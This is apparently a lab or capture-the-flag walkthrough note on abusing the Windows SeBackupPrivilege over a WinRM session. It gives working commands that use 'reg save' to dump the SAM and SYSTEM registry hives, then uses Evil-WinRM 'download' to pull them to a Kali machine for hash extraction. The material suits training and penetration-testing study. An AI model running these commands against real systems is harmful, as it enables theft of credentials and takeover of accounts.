
After connect via WinRM witih j.smith user you need to know what privileges has the user.

#Winrm 
Run the following comman:

```
whoami /priv
```

![[privileges.png]]

## SeBackupPrivilege

After enumurating `j.smith` privileges. We find that he has `SeBackupPrivilege` privilege `enabled`. This privilege allows the user to `read all the files in the system`.

This specific privilege escalation is based on the act of assigning a user the SeBackupPrivilege. It was designed to allow users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system. This privilege must bypass any ACL that the Administrator has placed in the network. So, in a nutshell, this privilege allows the user to read any file on the entirety of the files that might also include some sensitive files.

### Exploiting Privilege

#Winrm 
1. Traverse to the `C:\` directory .
2. Create a `Temp` directory. 
3. Change the directory to `Temp`. 
4. Here read the `SAM` file and save a variant of it. 
5. Similarly, read the `SYSTEM` file and save a variant of it.

```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

### **Transferring Files to Kali Linux**

#Winrm 
Now that the Temp directory contains the SAM and SYSTEM files, use the Evil-WinRM `download` command to transfer these files to your Kali Linux machine.

```
cd Temp
download sam
download system
```

**Next step:** [[Administrator's NTLM hash]]

